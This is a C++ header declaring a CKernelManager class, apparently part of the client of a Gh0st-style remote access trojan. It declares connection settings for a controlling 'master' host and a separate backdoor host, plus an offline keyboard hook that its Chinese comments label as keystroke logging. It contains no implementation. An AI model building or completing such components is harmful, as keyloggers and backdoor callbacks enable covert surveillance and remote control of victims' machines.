// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KERNELMANAGER_H__D073A3EC_2409_4BC0_88E1_DC22AA07986B__INCLUDED_)
#define AFX_KERNELMANAGER_H__D073A3EC_2409_4BC0_88E1_DC22AA07986B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"

class CKernelManager : public CManager    
{
public:
	CKernelManager(CClientSocket *pClient, LPCTSTR lpszMasterHost, UINT nMasterPort);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void StartUnLineHook();// 离线键盘
	CKernelManager(CClientSocket *pClient);//键盘记录
	static	char	m_strMasterHost[256];
	static	UINT	m_nMasterPort;
	static	char	m_strDoorMasterHost[256];
	static	UINT	m_nDoorMasterPort;
private:
	HANDLE	m_hThread[1000]; // 足够用了
	UINT	m_nThreadCount;
};


#endif // !defined(AFX_KERNELMANAGER_H__D073A3EC_2409_4BC0_88E1_DC22AA07986B__INCLUDED_)

